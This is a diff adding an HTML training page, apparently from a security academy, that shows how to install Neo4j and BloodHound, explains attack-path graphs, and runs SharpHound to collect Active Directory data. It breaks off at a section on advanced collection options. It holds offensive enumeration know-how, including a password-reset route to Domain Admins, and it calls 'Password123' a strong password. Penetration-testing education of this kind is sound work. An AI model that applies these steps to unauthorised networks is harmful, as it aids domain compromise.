@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BloodHound Analysis and Installation Guide</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f9fafb; /* gray-50 */
+        }
+        .code-font {
+            font-family: 'JetBrains Mono', monospace;
+        }
+        /* Base terminal prompt style */
+        .terminal-prompt::before {
+            content: 'PS C:\\> ';
+            color: #10b981; /* emerald-500 */
+            margin-right: 0.5rem;
+            user-select: none;
+        }
+        /* Logic for custom prompts via data attribute */
+        .terminal-prompt[data-prompt]::before {
+            content: attr(data-prompt);
+        }
+        /* Allow prompt color to be overridden */
+        .terminal-prompt.text-yellow-400::before {
+            color: #fbbf24; 
+        }
+
+        .terminal-output {
+            white-space: pre-wrap;
+            color: #e5e7eb; /* gray-200 */
+            padding-top: 8px;
+            border-top: 1px solid #334155; /* slate-700 */
+            margin-top: 8px;
+        }
+        .bg-console {
+            background-color: #1e293b; /* slate-800 */
+        }
+        /* Custom styling for the visual steps section */
+        .visual-step {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            padding: 1rem;
+            border: 1px solid #e5e7eb;
+            border-radius: 0.75rem;
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
+        }
+        .visual-step img {
+            width: 100%;
+            height: auto;
+            border-radius: 0.5rem;
+            border: 1px solid #d1d5db;
+        }
+        .step-list {
+            list-style: none;
+            counter-reset: step-counter;
+        }
+        .step-list > li {
+            counter-increment: step-counter;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: flex-start;
+        }
+        .step-list > li::before {
+            content: counter(step-counter);
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            width: 2rem;
+            height: 2rem;
+            min-width: 2rem;
+            border-radius: 9999px;
+            background-color: #f59e0b; /* amber-500 */
+            color: white;
+            font-weight: bold;
+            margin-right: 1rem;
+        }
+        
+        /* Copy Button Styling */
+        .code-block-wrapper {
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #e5e7eb;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 0.375rem;
+            padding: 0.25rem 0.5rem;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            opacity: 0;
+        }
+        .code-block-wrapper:hover .copy-btn {
+            opacity: 1;
+        }
+        .copy-btn:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        .copy-btn.copied {
+            background-color: #10b981;
+            color: white;
+            border-color: #10b981;
+        }
+        
+        /* Google Translate Customization */
+        .goog-te-gadget {
+            font-family: 'Inter', sans-serif !important;
+            font-size: 0px !important; /* Hide text */
+        }
+        .goog-te-gadget .goog-te-combo {
+            margin: 0 !important;
+            padding: 0.5rem !important;
+            border-radius: 0.375rem !important;
+            border: 1px solid #e5e7eb !important;
+            font-size: 0.875rem !important;
+            color: #374151 !important;
+            background-color: white !important;
+            cursor: pointer;
+            outline: none;
+        }
+        .goog-te-gadget span {
+            display: none !important; /* Hide 'Powered by Google' */
+        }
+        /* Hide the top banner frame */
+        .goog-te-banner-frame {
+            display: none !important;
+        }
+        body {
+            top: 0 !important;
+        }
+    </style>
+</head>
+<body class="text-gray-700 relative">
+
+    <!-- Scroll to Top Button -->
+    <button id="scrollToTopBtn" class="fixed bottom-8 right-8 bg-cyan-700 text-white p-3 rounded-full shadow-lg opacity-0 transition-opacity duration-300 hover:bg-cyan-800 focus:outline-none z-50 pointer-events-none">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <header class="bg-white/95 backdrop-blur-md sticky top-0 z-50 shadow-lg border-b border-cyan-700/30">
+        <nav class="container mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center">
+                    <a href="https://www.rednexus.academy" class="flex items-center">
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALwAAACUCAMAAAAeaLPCAAABHVBMVEUAAAD///+8JXTaIEneIT7mHjq8JG3NIlfrHi/BI2kAAwDqHzTGI2YYGBjDImfjHzvcH0bUIE/VIFPKI1vKIl+4uLj29vbg4ODHI2J4EzbHx8cPDw+MjIx5eXm9JXrq6uo6OjpSUlIlJSUwMDCnp6dfX19HR0eVlZUiBgsADQbS0tJnZ2dwcHAeHh6Dg4O7Hzr5HCpCDyS4HkC1IF1QDBCLEye5GjHKHjH6HzrQIT+sHUBqFysPAgJNFi8xDBx6EBzLJHtpGBmGFjKWGiSzIk/oHFeqFiZXFic7CxLQGys+ER1BDw+SHUCQJl9jIUSeFy1YDS6rLFd1HkkcChSnJWeFG0aVG1EtCQ3zGkZyFSZfDRxqGTuxFB2fHUBAFy/FmrmiAAAIc0lEQVR4nO2aa1fbRhCGV8ZX2eKSIInoUt21riUZUhoujUNIS0NIS0tSQgpp8/9/RmdWkm3ZSz/0yBx6zr4nEFky+NFoNPPOCkKEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhGrWZHGHvLRDXtr1WDWZkCqs/H+A/3aG+PhhCYMcfv/i4LDV7/ePWq1Ws9k83v3hZSWTJs/n9erVCdvr5gpM9koxCxFTKfQQ9K8v9vb2ut1uvw/sGwC/ubm29sM8/cvt7cFg0Ou1G6jT0zajlQqpjFItRJWxUSj0Vg7/JkdfgN/6cY7+2fbOem+9127n9N/k8I6kaRrSR/DKLU9l5IflpqSvHP4gR1+AX9u6K9Ne5sObI82w7VCH0CO8JmlGGIaqZVqapIeh4QB9sGr4n/a6nMivrXWG07cswjdwp6JJI4CjkqThS4C3Md1N4huSlpDABvqV583wiJc2EPqzacXhw0NaxAxeLeDT4u2qJMGmO8oTapWS5Tf8yG/9/Kx8z33wmkc8iG8GOQRpoyczeJsQT5e0lcOTyds89IvwW0/OS/ide+BjkgK86pHIkRzP9H2/gLdIhqcwXjG9PCHvLvb6XPiz9/8OL4U0hHqjxmQMWYOFMpzC+/BdVZP7P7gWePi6u+BH/smHk3+HZzIgbWIr39aoW8CTMcAH2Wrhme6Oun0e/JNfJ3h2i/Blk9JUAwJvsF+hFaU9LuETTaIPgA56sQfsHPjOSzx6H7zj4W0pAS/GWacg2y/glVDS3IdAh+AeHPHhO++xSfHgoUlBcQwMVs1tTXLM8tflkY/htFac8rkm8i+HPPhOp3M2XI78Nf5MXiqxmgM83LAzL5DD4zVJ7/3EWiXftY5aG5zIdyDtF+BPL2fwwRTeWYDHyK/emeXw5EWrz4XvPFuC/43BawgPqY05vxj5MbReuIUfhh0Sh/x+1OfAP+2cvb+a77DtRpu5niLykPOUwUsOSs3hdVaHtAeCB8kHRxvLOQ/0Hz5V7EH7I5nBY+TTHD4v+oTMLPEDlUqCU/jnJueG7Tx9ur0zGMzBX/7BJnZF17GoW7qD1Wak5zI8Yjn55sh6MHbwCfKb5n3w++vr673e6Wmjcf1xUgy4mZJBdWQueDb6+cp0++HQmSYvmlz47cGvXz7d3FxfX19++bq0TvJY9Hm3xYfffy6fgIaPlhx1fsxNm53BzR+LbzUti0K2e5TisBfYhTySUtxvRpT6JFVVqJqRajC7SQ24E1boNK+amzz49cGnxZWcLK8tNDcBVllhQpLC/gCHWj3AymMw4wMtLHPK5YbVoAPf7Z9AvwQP9FcL70VLrPlIjfBAqWGJcaDEUF1TA/ANRoy71bKFpdDVRgb0Xb3uEWUW1l1ezu8Mevsn1dgzP5+U8DYyxSDIIRgNR4Gq6zTDoyNwxzBn+Wje4FpkYCTqn68m39/e3p5/Ju+OOfCDQW9wg95+xq/kSTKDH5ULHRGeCB5j5yH5RDFwaQHg4USIIem1Wh5cRn1zeLgBdfJw9+7umA/fu2EuogKvIzwGMoFttziC46suOXhOaC0DYgL8GDy0pDG3qVsmB+I/wxPyFmYpcMSti+bGGj/y0GG/zP8Q2gNwLwAfejiHY7stNC6MQgkP0QarhsmDMTezOvsXJMNBt5ikWq3jjYUbdhvtAfiDXnv/VRXecKR0zLwNxHoUJ0niskNo8vNVHJvdqnAKToA3rKQZKvXqHWzl193u3BjY3N3iR759c1KBD3VJzeHHeuHL8nSGIsMGK3O+2qD1X4FfG14swJ9z4Xvtxk0FnqrSyMrnJXvmKmEOwchHi/DQz0JVdaT5BKtBr7sL8JPbLW7k242P02cmGHlbcvK1PexVDi5rs6jaZSuqwmeUWi6UoXpL5U/dyqJTc3dIfkT4zjJ84zcyg1cD6Eys2owdaElB4LOFGt+AwYTFt5o2VNLCgNRd599Wl/sQ/vMZH759/ZVM4Z04Yrni4g07a/oeXJMwT+3UYPaAwRd1vmZ4mQNP3nX4kT+9HE7hoY8y+KAKDymUBpD+kVmJ/GrgyV8V+M1NhCfnHV7O4yTFVtFY2pgs8oZZhXc1SBmdXRG0Bxmr8Bkrm8qq4fPIE/LsZz48zLAlfJbh7GrnM3eIgrZqG+gMLOYXsEmp49Ap7IGmWmHNN6zMhzf/5sM32iztGTz2zqJJTWs4dCTYEzMb5uNxNpx7xHWK7ZFbIzw/8jJ533nChc9XzMDPGz7mN3r1KbzBQg4NKjPypScjXz3GYdzLu5Re6zrahA8/Ic9x4WMZvnF6g+fGJm8Yw3EOL4fuzDezTCmezCo+KTamH2XWP5bz0wbXtrmRB13hkxyXQWalRZy3LG5uj02/POjWDl1I/qv6TKr5XQk//Pse+EvoOZbtQchJ4pkm9KbAjXySBUQxffhGPSXAq5J6puIqJCAWnEiGF6Pup5vyWy486uSM2coleMgbl9pppKRkbFskiTzbS6I4TVI7GkfEDWM4aHvK2EqCJPXGCnWjyPatJK19BLwXHm5aSHqwxJWFVtArhE8T6o6JHYc+tagbUJpQm9puaBPf8oA48SHytmeFiUcMK7XCmHrUrhm+sAc5PcL/PrfOcfW0g4YePGWv1yhK5SU6Y9dK7ITGxHZpMrbDOEiBz4xS4lNXGbuWZ0VmZru2GlA7ImFipUFgmX5Y5xSFen3B5pD+IYyBh4fNrZeVSfvq04cP+0zXN5cfr74Wn24mnkKgrQaQ1JFHIEcyJU6DzLRjYgYkTswM8xzy3g3gn+lHqen7aa12mEn+diYcsuXpyhj/j4TKw+aqnxL/B03mFznk/Iv9J+MfQQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJPT79A7TyH2m3jfVvAAAAAElFTkSuQmCC" alt="RedNexus" class="h-10 w-auto mr-3 rounded-md">
+                    </a>
+                    <a href="https://blogs.rednexus.academy" class="text-cyan-700 border border-cyan-700 hover:bg-cyan-50 transition duration-150 ease-in-out px-4 py-2 rounded-md font-bold text-sm">
+                        Blogs
+                    </a>
+                </div>
+                
+                <div class="hidden md:flex md:items-center md:space-x-4">
+                    <a href="https://rednexus.academy/certificates" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Certificates</a>
+                    <a href="https://rednexus.academy/courses" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Courses</a>
+                    <a href="https://hossamshady.medium.com/" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Medium</a>
+                    <a href="https://rednexus.academy/faq" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">FAQ</a>
+                    <a href="https://rednexus.academy/events" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Events</a>
+
+                    <a href="mailto:support@rednexus.academy" class="text-cyan-700 border border-cyan-700 hover:bg-cyan-50 transition duration-150 ease-in-out px-4 py-2 rounded-md font-bold text-sm ml-2">
+                        Contact Us
+                    </a>
+                    
+                    <!-- Translate Widget Container -->
+                    <div id="google_translate_element" class="ml-2"></div>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-10 md:py-16">
+
+        <!-- Introduction Header (Branding Removed) -->
+        <section id="intro-header" class="mb-16">
+            <div class="bg-white p-8 rounded-xl shadow-2xl border border-gray-300 text-center">
+                <h1 class="text-4xl font-extrabold text-cyan-700 mb-0">BloodHound: Visualizing the Attack Path</h1>
+            </div>
+        </section>
+
+
+        <!-- Installation Section (NEW FIRST CONTENT SECTION) -->
+        <section id="installation" class="mb-16 pt-10 -mt-10">
+            <h2 class="text-3xl font-bold text-cyan-700 mb-6">1. Installation and Setup (Windows/Neo4j)</h2>
+            <p class="text-gray-600 mb-6">
+                BloodHound requires a <b>Neo4j database</b> to store and query the data. The following steps detail the typical setup procedure on a Windows attacker machine.
+            </p>
+
+            <div class="bg-white p-6 rounded-xl shadow-2xl border border-gray-300">
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mb-4">Phase A: Neo4j Service Setup (Command Line)</h3>
+
+                <p class="text-gray-600 mb-4">
+                    Ensure you have the <b>Java Runtime Environment (JRE) version 17 or higher</b> installed. Download the Neo4j Server zip file and extract it.
+                </p>
+
+                <div class="mb-6 bg-gray-100 p-3 rounded-lg border-l-4 border-indigo-600">
+                    <p class="font-semibold text-indigo-700">Download Links:</p>
+                    <p class="text-sm text-gray-700 mt-1">
+                        <span class="font-bold">Neo4j Server (compatible with JRE 17+):</span> 
+                        <a href="https://neo4j.com/download-center/#community" target="_blank" class="text-indigo-600 hover:text-indigo-800 font-medium underline">Neo4j Download Center</a>
+                    </p>
+                </div>
+                
+                <ol class="step-list">
+                    <li>
+                        <div class="w-full">
+                            <p class="font-semibold text-gray-800 mb-1">Install Neo4j as a Windows Service</p>
+                            <p class="text-sm text-gray-600">Open an <b>elevated PowerShell terminal</b> inside the extracted Neo4j <code>bin</code> folder and execute the installation command:</p>
+                            <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                <div class="text-green-400 terminal-prompt">cd .\neo4j-community-2025.10.1\bin\</div>
+                                <div class="text-green-400 terminal-prompt">.\neo4j.bat windows-service install</div>
+                                <pre class="terminal-output text-sm text-green-200">Neo4j service installed.</pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="w-full">
+                            <p class="font-semibold text-gray-800 mb-1">Start the Service (If Access Denied , Open Powershell as Administrator)</p>
+                            <p class="text-sm text-gray-600">Start the newly installed service:</p>
+                            <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                <div class="text-green-400 terminal-prompt">net start neo4j</div>
+                                <pre class="terminal-output text-sm text-green-200">The Neo4j Graph Database - neo4j service is starting..
+The Neo4j Graph Database - neo4j service was started successfully.</pre>
+                            </div>
+                        </div>
+                    </li>
+                </ol>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Phase B: GUI and Client Setup</h3>
+                
+                <!-- Step 3: Initial Login -->
+                <div class="visual-step">
+                    <div class="flex items-center space-x-3">
+                        <span class="inline-flex justify-center items-center w-8 h-8 rounded-full bg-amber-500 text-white font-bold">3</span>
+                        <p class="font-semibold text-lg text-gray-800">Initial Neo4j Browser Login</p>
+                    </div>
+                    <!-- CHANGED TEXT-RED-500 TO TEXT-SKY-500 -->
+                    <p class="text-sm text-gray-600">Once the service is started, open your web browser and navigate to <code class="text-sky-500 font-bold underline">http://localhost:7474</code>. Use the default credentials: <b>Username: neo4j</b> and <b>Password: neo4j</b>.</p>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound1.jpg" alt="Screenshot showing the Neo4j web browser login page." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+1+Unavailable'" loading="lazy">
+                </div>
+
+                <!-- Step 4: Change Default Password -->
+                <div class="visual-step">
+                    <div class="flex items-center space-x-3">
+                        <span class="inline-flex justify-center items-center w-8 h-8 rounded-full bg-amber-500 text-white font-bold">4</span>
+                        <p class="font-semibold text-lg text-gray-800">Change Default Password</p>
+                    </div>
+                    <p class="text-sm text-gray-600">You will be prompted to change the default password immediately. Set a strong password, such as <b>Password123</b> for lab environments, and click <b>Change</b>.</p>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound2.jpg" alt="Screenshot showing the Neo4j prompt to change the default password." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+2+Unavailable'" loading="lazy">
+                </div>
+
+                <!-- Step 5: Download BloodHound Client -->
+                <div class="visual-step">
+                    <div class="flex items-center space-x-3">
+                        <span class="inline-flex justify-center items-center w-8 h-8 rounded-full bg-amber-500 text-white font-bold">5</span>
+                        <p class="font-semibold text-lg text-gray-800">Download the BloodHound GUI Client</p>
+                    </div>
+                    <p class="text-sm text-gray-600">Navigate to the official BloodHound GitHub **releases** page to download the latest executable client for Windows.</p>
+                    <div class="mb-2 bg-gray-100 p-3 rounded-lg border-l-4 border-indigo-600">
+                        <p class="text-sm text-gray-700">
+                            <span class="font-bold">BloodHound GUI Client Releases:</span> 
+                            <a href="https://github.com/BloodHoundAD/BloodHound/releases" target="_blank" class="text-indigo-600 hover:text-indigo-800 font-medium underline">GitHub Releases Page</a>
+                        </p>
+                    </div>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound3.jpg" alt="Screenshot showing the GitHub releases page for the BloodHound client." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+3+Unavailable'" loading="lazy">
+                </div>
+                
+                <!-- Step 6: Launch BloodHound -->
+                <div class="visual-step">
+                    <div class="flex items-center space-x-3">
+                        <span class="inline-flex justify-center items-center w-8 h-8 rounded-full bg-amber-500 text-white font-bold">6</span>
+                        <p class="font-semibold text-lg text-gray-800">Launch the BloodHound Client</p>
+                    </div>
+                    <p class="text-sm text-gray-600">Run the downloaded client executable (e.g., `BloodHound.exe`). It will attempt to connect to your running Neo4j service automatically.</p>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound4.jpg" alt="Screenshot showing the BloodHound client executable being run from a folder." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+4+Unavailable'" loading="lazy">
+                </div>
+                
+                <!-- CHANGED FROM RED-700/RED-600/RED-800 TO CYAN-700/CYAN-600/CYAN-800 -->
+                <h4 class="text-lg font-bold text-cyan-700 mt-6 mb-3">Troubleshooting: Service Failures or Removal</h4>
+                <div class="bg-cyan-50 p-4 rounded-xl border-l-4 border-cyan-600 text-cyan-800">
+                    <p class="font-semibold mb-2">If the service fails to start or you need to reinstall, use the following command to remove the service first:</p>
+                    <p class="text-sm code-font mb-3">The primary issue is often an incompatible <b>Java version</b> or a conflict. Ensure JRE 17+ is installed.</p>
+                    <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 text-sm text-white code-block-wrapper">
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        <span class="text-green-400 terminal-prompt">.\neo4j.bat windows-service uninstall</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Introduction & Overview (MOVED FROM TOP) -->
+        <section id="overview" class="mb-16 pt-10 -mt-10">
+            <!-- CHANGED TO CYAN-700 -->
+            <h2 class="text-3xl font-bold text-cyan-700 mb-6">2. Theory & Concepts (Overview)</h2>
+            <p class="text-gray-600 mb-6">
+                <b>BloodHound</b> is a single-page JavaScript web application backed by a Neo4j graph database. It is the industry standard for identifying and visualizing complex **attack paths** within an Active Directory environment. Instead of manual enumeration, BloodHound applies **graph theory** to quickly find the shortest route from a low-privilege entry point to highly sensitive targets like Domain Admin (DA).
+            </p>
+            
+            <h3 class="text-xl font-bold text-gray-800 border-b pb-2 mb-3">Graph Theory, Nodes, and Edges</h3>
+            <p class="text-gray-600 mb-4">
+                BloodHound utilizes **Graph Theory**, mathematical structures used to model pairwise relations between objects. A graph in this context is made up of **nodes** (Active Directory objects such as users, groups, computers, etc.) which are connected by **edges** (relations between objects such as membership of a group, AdminTo, etc.).
+            </p>
+
+            <div class="bg-gray-100 p-4 rounded-lg border-l-4 border-yellow-600 mb-6">
+                <p class="font-semibold text-yellow-700 mb-2">Example of a Directed Edge (Simple):</p>
+                <p class="text-gray-700">The below diagram shows two nodes, <b>A</b> and <b>B</b>. In this example, we can only go from node <b>A</b> to node <b>B</b>, not the other way. This mimics a trust relationship (like AdminTo) which is often one-way.</p>
+                <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound5.png" alt="Diagram showing a directed edge from node A to node B." onerror="this.onerror=null;this.src='https://placehold.co/800x200/AAAAAA/FFFFFF?text=Image+5+Unavailable'" loading="lazy" class="mt-4">
+                
+                <p class="text-gray-700 mt-4">
+                    This could simulate <b>A</b> as the user <b>Grace</b> and <b>B</b> as the group <b>SQL Admins</b>. The line between the two is the edge, which in this case is <b>MemberOf</b>. The next graphic shows us that relationship in BloodHound, where the user <b>Grace</b> is a member of the <b>SQL Admins</b> group.
+                </p>
+                <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound6.jpg" alt="BloodHound diagram showing user Grace is a MemberOf SQL Admins group." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+6+Unavailable'" loading="lazy" class="mt-4">
+
+                <p class="font-semibold text-yellow-700 mt-6 mb-2">Example of Shortest Path (Complex):</p>
+                <p class="text-gray-700">
+                    Let’s see a more complex relationship between nodes. The following graphic shows eight (8) nodes and ten (10) edges. Node <b>H</b> can reach node <b>G</b>, but no node has a direct path to node <b>H</b>. To get to node <b>C</b> from node <b>A</b>, we can hop to node <b>G</b>, move to node <b>F</b>, and then to node <b>C</b>, but that’s not the shortest path. One of the BloodHound capabilities is to look for the **shortest path**. In this example, the shortest path from node <b>A</b> to node <b>C</b> is one hop through node <b>B</b>.
+                </p>
+                <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound7.png" alt="Diagram showing a complex graph relationship and the shortest path from A to C." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+7+Unavailable'" loading="lazy" class="mt-4">
+
+                <p class="font-semibold text-yellow-700 mt-6 mb-2">BloodHound's Pathfinding Advantage:</p>
+                <p class="text-gray-700">
+                    In the previous example, we used BloodHound to find that <b>Grace</b> is a member of <b>SQL Admins</b>, which is pretty simple to discover using tools like <b>Active Directory Users and Computers</b> GUI or the <code>net user grace /domain</code> command. With only that information, we might incorrectly conclude that <b>Grace</b> doesn’t have any path to the <b>Domain Admins</b> group. However, this is where BloodHound is much more helpful in identifying those complex, often non-obvious relationships between nodes that are not easy to locate manually.
+                </p>
+                <p class="text-gray-700 mt-2 mb-4">
+                    Let’s use BloodHound as our map navigator and ask it to find the shortest path from the user <b>Grace</b> to the <b>Domain Admins</b> group. Here’s the result:
+                </p>
+                <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound8.jpg" alt="BloodHound diagram showing the shortest attack path from Grace to Domain Admins." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+8+Unavailable'" loading="lazy" class="mt-4">
+                <p class="text-gray-700 mt-4">
+                    This means that <b>Grace</b>, as a member of the <b>SQL Admins</b> group, can change <b>Peter’s</b> password. Authenticate with <b>Peter’s</b> new password and perform operations as a member of the <b>Domain Admins</b> group. Although <b>Peter</b> is not a member directly, he is a member of a group that is.
+                </p>
+
+            </div>
+
+            <h3 class="text-xl font-bold text-gray-800 border-b pb-2 mb-3">Cypher Query Language</h3>
+            <p class="text-gray-600 mb-4">
+                The tool uses **Cypher Query Language** to analyze these relationships. Cypher is Neo4j’s graph query language that lets us retrieve data from the graph. It is like SQL for graphs, and was inspired by SQL, so it lets us focus on *what* data we want out of the graph (not how to go get it). It is the easiest graph language to learn by far because of its similarity to other languages and intuitiveness. We will discuss more about Cypher queries later in this module.
+            </p>
+
+            <div class="bg-gray-100 p-4 rounded-lg border-l-4 border-cyan-600">
+                <p class="font-semibold text-cyan-700">The Power of Graph Theory:</p>
+                <p class="text-gray-700">BloodHound models AD objects (Users, Groups, Computers) as <b>Nodes</b> and relationships (MemberOf, CanLogOnTo, WriteDACL) as <b>Edges</b>. This representation allows for rapid querying and pathfinding that is impossible with standard AD tools.</p>
+            </div>
+        </section>
+
+        <!-- Data Collection Section (Updated) -->
+        <section id="data-collection" class="mb-16 pt-10 -mt-10">
+            <!-- CHANGED TO CYAN-700 -->
+            <h2 class="text-3xl font-bold text-cyan-700 mb-6">3. SharpHound - Data Collection from Windows</h2>
+            
+            <p class="text-gray-600 mb-6">
+                <b>SharpHound</b> is the official data collector tool for <b>BloodHound</b>. It is written in C# and can be run on Windows systems with the .NET framework installed. The tool uses various techniques to gather data from Active Directory, including native Windows API functions and LDAP queries. The data collected by SharpHound can be used to identify security weaknesses in an Active Directory environment to attack it or to plan for remediation.
+            </p>
+
+            <div class="bg-white p-6 rounded-xl shadow-2xl border border-gray-300">
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mb-4">Running SharpHound.exe</h3>
+
+                <p class="text-gray-600 mb-4">
+                    When you download and extract the BloodHound client (Step 5 of Installation), the collector is typically found here: <code class="font-bold text-sky-400">\BloodHound-win32-x64\resources\app\Collectors</code>.
+                </p>
+                
+                <p class="text-gray-600 mb-4">
+                    The most comprehensive collection method is <code>-c All</code> (or <code>--collectionmethod All</code>), which attempts to collect all possible data points.
+                </p>
+
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="C:\tools> ">SharpHound.exe -c all</div>
+                    <pre class="terminal-output text-sm text-green-200">2025-01-01 10:00:00 - Starting SharpHound v1.1.1
+2025-01-01 10:00:00 - Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote.
+2025-01-01 10:00:00 - Running against Domain: TARGET.LOCAL
+...
+2025-01-01 10:00:15 - Finished collection in 00:00:15. Collected 500 objects.
+2025-01-01 10:00:15 - Compressing data to 20250101100015_BloodHound.zip
+2025-01-01 10:00:16 - Collection complete!</pre>
+                </div>
+                
+                <h4 class="text-lg font-bold text-gray-800 mt-6 mb-3">Understanding Collection Methods</h4>
+                
+                <p class="text-gray-600 mb-4">
+                    The 2nd line in the output above indicates the collection methods used by default with <code>-c All</code>: <b>Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</b>.
+                </p>
+                
+                <p class="text-gray-600 font-semibold mb-2">These methods mean that we will collect the following information:</p>
+                <ul class="list-disc list-inside ml-4 text-gray-600 space-y-2">
+                    <li>Users and Computers.</li>
+                    <li>Active Directory security group membership.</li>
+                    <li>Domain trusts.</li>
+                    <li>Abusable permissions on AD objects (<span class="font-bold">ACL</span>).</li>
+                    <li>OU tree structure (<span class="font-bold">Container</span>).</li>
+                    <li>Group Policy links.</li>
+                    <li>The most relevant AD object properties (<span class="font-bold">ObjectProps</span>).</li>
+                    <li>Local groups from domain-joined Windows systems and local privileges such as RDP, DCOM, and PSRemote.</li>
+                    <li>User sessions (<span class="font-bold">Session</span>).</li>
+                    <li>All SPN (Service Principal Names) linked to user accounts (<span class="font-bold">SPNTargets</span>).</li>
+                </ul>
+
+                <h4 class="text-lg font-bold text-gray-800 mt-6 mb-3">Privilege Requirements for Full Collection</h4>
+                <p class="text-gray-600 mb-4">
+                    To get the information for **local groups** and **sessions**, SharpHound will attempt to connect to each domain-joined Windows computer from the list it collected. If the user from which SharpHound is running has privileges on the remote computer, it will collect the following information:
+                </p>
+                <ul class="list-disc list-inside ml-4 text-gray-600 space-y-2">
+                    <li>The members of the local administrators, remote desktop, distributed COM, and remote management groups.</li>
+                    <li>Active sessions to correlate to systems where users are interactively logged on.</li>
+                </ul>
+                <div class="bg-yellow-100 p-3 rounded-lg border-l-4 border-yellow-600 mt-4">
+                    <p class="font-semibold text-yellow-700">Note:</p>
+                    <p class="text-gray-700 text-sm">Gathering information from domain-joined machines, such as local group membership and active sessions, is only possible if the user session from which SharpHound is being executed has **Administrator rights** on the target computer.</p>
+                </div>
+                
+                <div class="bg-gray-100 p-3 rounded-lg border-l-4 border-blue-600 mt-6">
+                    <p class="font-semibold text-blue-700">Output Summary:</p>
+                    <p class="text-gray-700 text-sm">Once SharpHound terminates, by default, it will produce a **zip file** whose name starts with the current date and ends with BloodHound (e.g., <code>20250101100016_BloodHound.zip</code>). This zip archive contains a group of **JSON files** ready for import.</p>
+                    <img src="https://raw.githubusercontent.com/hossamshady11/images/refs/heads/main/bloodhound9.png" alt="Screenshot showing the contents of the SharpHound zip file." onerror="this.onerror=null;this.src='https://placehold.co/800x400/AAAAAA/FFFFFF?text=Image+9+Unavailable'" loading="lazy" class="mt-4">
+                </div>
+
+                <!-- Collection Methods & OpSec Flags -->
+                <h4 class="text-lg font-bold text-gray-800 mt-8 mb-3 border-b pb-2">Advanced Collection Methods and Options</h4>
+                
+                <p class="text-gray-600 mb-4">
